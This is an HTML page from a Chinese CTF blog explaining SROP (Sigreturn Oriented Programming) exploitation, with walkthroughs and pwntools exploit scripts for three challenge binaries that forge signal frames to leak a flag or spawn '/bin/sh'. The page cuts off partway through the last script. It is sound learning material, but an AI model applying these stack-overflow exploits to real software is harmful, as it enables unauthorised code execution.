@@ -1,0 +1,737 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/QQ%E5%9B%BE%E7%89%8720220919213937.jpg">
+  <link rel="icon" href="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/QQ%E5%9B%BE%E7%89%8720220919213937.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Nightu">
+  <meta name="keywords" content="Nightu CTF pwn">
+  
+    <meta name="description" content="干碎我的栈题学习记录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SROP">
+<meta property="og:url" content="http://n1ghtu.github.io/posts/341e3484.html">
+<meta property="og:site_name" content="Nightu">
+<meta property="og:description" content="干碎我的栈题学习记录">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/ProcessOfSignalHandlering.png">
+<meta property="og:image" content="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/srop-example-1.png">
+<meta property="og:image" content="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220329111928988.png">
+<meta property="og:image" content="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220329141956305.png">
+<meta property="og:image" content="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220329152145281.png">
+<meta property="og:image" content="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220329161716980.png">
+<meta property="article:published_time" content="2022-03-28T15:03:12.000Z">
+<meta property="article:modified_time" content="2022-09-20T04:04:07.772Z">
+<meta property="article:author" content="Nightu">
+<meta property="article:tag" content="Nightu CTF pwn">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/ProcessOfSignalHandlering.png">
+  
+  
+  
+  <title>SROP - Nightu</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"n1ghtu.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":120,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Nightu&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="SROP"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-03-28 23:03" pubdate>
+          2022年3月28日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          13k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          113 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">SROP</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <blockquote><p>感觉到难大概是因为还没学会罢，愿在掌握之后再回头看能看到不一样的风景。</p>
+</blockquote>	
+<h1>SROP(Sigreturn Oriented Programming)</h1>
+<h2 id="理解"><a class="header-anchor" href="#理解">¶</a>理解</h2>
+<p>网上很多大佬原理写的很好了，我这里就写点自己想法。</p>
+<p>首先了解一下，signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。</p>
+<p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/ProcessOfSignalHandlering.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>你不懂没关系（<s>我也不懂</s>），简单来说你发送 signal 的时候，会先把你的寄存器和 signal 信息存到你的用户栈里，然后跳到内核态去处理 signal，内核返回用户态执行信号处理之前，会设置信号处理函数的返回地址(x30)指向[vdso]中的 <strong>__kernel_rt_sigreturn</strong> 函数，来从栈中恢复取出之前所存的信息（<strong>无检验</strong>）。</p>
+<p>那么我们试想一下，如果存在一个栈溢出漏洞。我们自己写一系列精心构造的数据，伪装成我们的寄存器和 signal 信息，然后先把返回地址覆盖成 <strong>Sigreturn</strong> ，后面紧跟着我们自己构造好的寄存器和 signal 信息，相当于我们恶意利用了这个恢复机制，于是我们可以控制 rip rsp 在内的所有寄存器，那么自然就可以控制程序执行了。</p>
+<p>进一步，如果知道 <code>/bin/sh</code> 的地址，存在 syscall ，那么我们直接如下构造就可以 getshell 。</p>
+<p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/srop-example-1.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>但一般程序是不会直接给你 <code>/bin/sh</code> 的，你需要自己通过 read 往某个地址写。这就需要构造 SROP 链（关键gadget：<code>syscall;ret</code>），具体的我们下面看几个题。</p>
+<hr>
+<h2 id="利用前提"><a class="header-anchor" href="#利用前提">¶</a>利用前提</h2>
+<p>大概是：</p>
+<ol>
+<li>syscall，signal 没 syscall 👦 玩毛 。</li>
+<li>足够大的溢出空间，要能放得下伪造的 Frame。</li>
+<li>好用的 gadget （非必要,详见 <code>smallest</code>），比如 pop rax 之类的，就算没有 <strong>Sigreturn</strong> ，x64 下把 rax 调到 15 后执行 syscall 是一样的效果。</li>
+</ol>
+<p>一般思路是想办法搞到 <code>/bin/sh</code> 的位置（没有就写一个）后利用 SROP 执行 execve ，其他的我不好说，直接看题吧。</p>
+<hr>
+<h2 id="例题"><a class="header-anchor" href="#例题">¶</a>例题</h2>
+<p>额，大概是从易到难吧。后面要是追加就不算了。</p>
+<h3 id="FUNSIGNALS（白给的-Sigreturn）"><a class="header-anchor" href="#FUNSIGNALS（白给的-Sigreturn）">¶</a>FUNSIGNALS（白给的 Sigreturn）</h3>
+<h4 id="分析"><a class="header-anchor" href="#分析">¶</a>分析</h4>
+<p>丢到 IDA 里面去，单纯的 SROP 题目都是比较简洁的。</p>
+<p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220329111928988.png" srcset="/img/loading.gif" lazyload alt="image-20220329111928988"></p>
+<p>首先要看懂这个程序：</p>
+<ol>
+<li><code>mov dh, 4</code> 的意思在这里是 <code>RDX = 0x400</code>，不清楚的话可以去 gdb 下断点后按 r 再跑一遍自己验证。`</li>
+<li>开头到第一个 syscall 意思就是在 rsp 的地方读入 0x400 的数据。</li>
+<li>题目贴心的是，后面的 <code>push 0xF pop rax syscall</code>，相当于直接调用了 <strong>Sigreturn</strong> 了（RAX = 15）。后面的 <code>int 3</code> 你不用管它，我们 Sigreturn 的是自己构造的 Frame ，把 rsp 和 rip 🐑 了就没它的事了。</li>
+</ol>
+<p>我们要干的事也很简单，简单的构造一个恶意 Frame ，用 write 去泄露这个 flag 。直接调用 pwntools 构造。</p>
+<h4 id="Exp"><a class="header-anchor" href="#Exp">¶</a>Exp</h4>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#python2</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :p.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    gdb.attach(p,cmd)<br><br>p = process(<span class="hljs-string">&#x27;./FUNSIGNALS&#x27;</span>)<br><span class="hljs-comment"># p = remote(&#x27;hack.bckdr.in&#x27;,17002)</span><br>elf = ELF(<span class="hljs-string">&#x27;./FUNSIGNALS&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>])<br><br>frame=SigreturnFrame()<br>frame.rax = constants.SYS_write <span class="hljs-comment"># 1 is ok</span><br>frame.rdi = constants.STDOUT_FILENO <span class="hljs-comment"># 1 is ok</span><br>frame.rsi = elf.sym[<span class="hljs-string">&#x27;flag&#x27;</span>]<br>frame.rdx = <span class="hljs-number">100</span><br>frame.rip = elf.sym[<span class="hljs-string">&#x27;syscall&#x27;</span>]<br><br>p.sendline(<span class="hljs-built_in">str</span>(frame))<br>p.interactive()<br></code></pre></td></tr></table></figure>
+<hr>
+<h3 id="rootersctf-2019-srop（pop-rax-构造的-Sigreturn）"><a class="header-anchor" href="#rootersctf-2019-srop（pop-rax-构造的-Sigreturn）">¶</a>rootersctf_2019_srop（pop rax 构造的 Sigreturn）</h3>
+<h4 id="分析-v2"><a class="header-anchor" href="#分析-v2">¶</a>分析</h4>
+<p>程序逻辑也很简单：先输出 data 段 buf 内的信息，往 <code>rsp-0x40</code> 处写入 <code>0x400</code> 的数据。</p>
+<p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220329141956305.png" srcset="/img/loading.gif" lazyload alt="image-20220329141956305"></p>
+<p>这题没有白给的 Sigreturn ，但是有个很好用的 gadget <code>pop rax syscall</code> 。</p>
+<p>基本思路是：第一次伪造 Frame 在已知地址处写入 <code>/bin/sh</code> ，第二次伪造 Frame 进行一个 <code>/bin/sh</code> 的 <code>execve</code> 。</p>
+<p>首先， 栈溢出覆盖 rip 为 <code>pop rax;syscall;leave;retn</code> 这个 gadget，后面紧跟 Sigreturn 调用号 15 和 第一个伪造的 Frame。</p>
+<p>有必要说明一下 Frame 具体的构造：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">fuck = SigreturnFrame()<br>fuck.rax = <span class="hljs-number">0</span>	<span class="hljs-comment"># read 调用号</span><br>fuck.rdi = <span class="hljs-number">0</span>	<span class="hljs-comment"># fd</span><br>fuck.rsi = <span class="hljs-number">0x402500</span>	<span class="hljs-comment"># buf</span><br>fuck.rdx = <span class="hljs-number">0x400</span>	<span class="hljs-comment"># count 不要写小了，没你好果汁吃(ᗜ_ᗜ）</span><br>fuck.rip = syscall_ret	<span class="hljs-comment"># syscall;leave;retn</span><br>fuck.rsp = <span class="hljs-number">0x402500</span>	<span class="hljs-comment"># bss 段已知地址</span><br>fuck.rbp = <span class="hljs-number">0x402500</span>	<span class="hljs-comment"># bss 段已知地址</span><br></code></pre></td></tr></table></figure>
+<p>那么我们预期中的程序流程是这样的：</p>
+<ol>
+<li>Sigreturn 恢复恶意 Frame 到寄存器 ，紧接着执行的是 Frame 中的 rip 也就是 <code>syscall;leave;ret</code> ，那么 <code>syscall</code> 就会先在 <code>0x402500</code> 处读入 <code>0x400</code> 的数据（ROP链++）。</li>
+<li><code>leave;ret</code> 意思是 <code>mov rsp,rbp;pop rbp;pop rip</code> ，<code>mov rsp,rbp</code>因为我们构造的是一样的地址所以没影响，<code>pop rbp</code> 会把我们 ROP 链的前八个字节给 🐑 了。所以我们要在 ROP 链上先填充 8 字节的垃圾 rbp 地址，那么 <code>pop rip</code> 时就会执行我们的 ROP 链。（是不是感觉有点栈迁移那味👦）</li>
+</ol>
+<p>ROP 链我们明显要用来伪造第二个 Frame，我们在 <code>0x402500</code> 写入 ROP 链同时我们顺带写上 <code>/bin/sh\0</code>，具体的直接看 Exp 。</p>
+<h4 id="Exp-v2"><a class="header-anchor" href="#Exp-v2">¶</a>Exp</h4>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :p.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./rootersctf_2019_srop&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;./rootersctf_2019_srop&#x27;</span>)<br>debug()<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">.text:0000000000401032                 pop     rax</span><br><span class="hljs-string">.text:0000000000401033                 syscall                 ; LINUX - sys_read</span><br><span class="hljs-string">.text:0000000000401035                 leave</span><br><span class="hljs-string">.text:0000000000401036                 retn</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>rax_syscall_leave_ret = <span class="hljs-number">0x401032</span><br>syscall_ret = <span class="hljs-number">0x401033</span><br>fuck = SigreturnFrame()<br>fuck.rax = <span class="hljs-number">0</span><br>fuck.rdi = <span class="hljs-number">0</span><br>fuck.rsi = <span class="hljs-number">0x402500</span><br>fuck.rdx = <span class="hljs-number">0x400</span><br>fuck.rip = syscall_ret<br>fuck.rsp = <span class="hljs-number">0x402500</span><br>fuck.rbp = <span class="hljs-number">0x402500</span><br><br>payload=flat(<br>    [<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x80</span>,<span class="hljs-number">0xdeadbeef</span>,rax_syscall_leave_ret,<span class="hljs-number">15</span>,fuck]<br>)<br>sl(payload)<br><br>wsnd = SigreturnFrame()<br>wsnd.rax = <span class="hljs-number">59</span><br>wsnd.rdi = <span class="hljs-number">0x402500</span> + <span class="hljs-number">0x200</span><br>wsnd.rsi = <span class="hljs-number">0</span><br>wsnd.rdx = <span class="hljs-number">0</span><br>wsnd.rip = syscall_ret<br>wsnd.rsp = <span class="hljs-number">0xdeadbeef</span><br>wsnd.rbp = <span class="hljs-number">0xdeadbeef</span><br><span class="hljs-comment"># print(len((p64(0xdeadbeef)+p64(rax_syscall_leave_ret)+p64(15)+str(wsnd))))  !!! 272 !!!</span><br>sl((p64(<span class="hljs-number">0xdeadbeef</span>)+p64(rax_syscall_leave_ret)+p64(<span class="hljs-number">15</span>)+<span class="hljs-built_in">str</span>(wsnd)).ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;/bin/sh\0&#x27;</span>) <span class="hljs-comment"># bin_sh = 0x402500 + 0x200</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+<hr>
+<h3 id="smallest（通过-read-字节数构造的-Sigreturn）"><a class="header-anchor" href="#smallest（通过-read-字节数构造的-Sigreturn）">¶</a>smallest（通过 read 字节数构造的 Sigreturn）</h3>
+<h4 id="分析-v3"><a class="header-anchor" href="#分析-v3">¶</a>分析</h4>
+<p>程序越来越短，gaget 越来越少 QWQ。这个相当直接，在 rsp 写处写 <code>0x400</code> 的数据，剩下的爱咋咋地。</p>
+<p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220329152145281.png" srcset="/img/loading.gif" lazyload alt="image-20220329152145281"></p>
+<p>并且这题在运行时并没有一个较为固定的可读可写地址，需要 leak 栈地址。</p>
+<p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220329161716980.png" srcset="/img/loading.gif" lazyload alt="image-20220329161716980"></p>
+<p><strong>关键点：x64 调用约定中说明了函数调用的返回值是存在 rax 里面的，而 <code>SYS_read</code> 返回值是读取的字节个数。</strong></p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">+───────+───────+──────────────+──────────────────+<br>|<span class="hljs-string"> %rax  </span>|<span class="hljs-string"> Name  </span>|<span class="hljs-string"> Entry point  </span>|<span class="hljs-string"> Implementation   </span>|<br>+───────+───────+──────────────+──────────────────+<br>|<span class="hljs-string"> 0     </span>|<span class="hljs-string"> read  </span>|<span class="hljs-string"> sys_read     </span>|<span class="hljs-string"> fs/read_write.c  </span>|<br>|<span class="hljs-string"> 1     </span>|<span class="hljs-string"> write </span>|<span class="hljs-string"> sys_write    </span>|<span class="hljs-string"> fs/read_write.c  </span>|<br>+───────+───────+──────────────+──────────────────+<br></code></pre></td></tr></table></figure>
+<p>而我们发现 write 的调用号是 1 ，意思是我们在读入一个字节的情况下跳过 <code>xor rax,rax</code> 这一步就会 write 出 rsp。</p>
+<ol>
+<li>
+<p>第一次执行先 read 塞入三个 <code>vuln_addr = 0x4000B0</code>，控制程序流程，每一次 ret 都执行一次 vuln。</p>
+</li>
+<li>
+<p>第二次执行仅 read 塞入一个字节，部分覆盖掉返回地址为 <code>NOxor_vuln = 0x4000B3</code> 。</p>
+</li>
+<li>
+<p>第三次执行，由于 write <strong>不受</strong> <code>\x00</code> 截断影响，到 syscall 时就会从 rsp 指针处开始 leak 出此时的栈信息（注意不是 rsp 指针地址，但是会输出很多栈内的地址）。</p>
+</li>
+<li>
+<p>第四次执行，read 塞入 <code>vuln_addr</code> 以及 Frame。</p>
+</li>
+<li>
+<p>第五次执行，read 塞入 <code>syscall;ret</code>  地址以及 Frame 前 7 个字节（凑齐 <code>RAX = 15</code>）。</p>
+</li>
+<li>
+<p>到这就和上题差不多了，第一个 Frame 读入 ROP 链，第二个 Frame 执行 <code>/bin/sh\0</code>。不过 ROP 构造还是要先读入一次，后续凑满 15 字节这样利用。熟悉流程后难度不大。</p>
+</li>
+</ol>
+<h4 id="Exp-execve"><a class="header-anchor" href="#Exp-execve">¶</a>Exp(execve)</h4>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 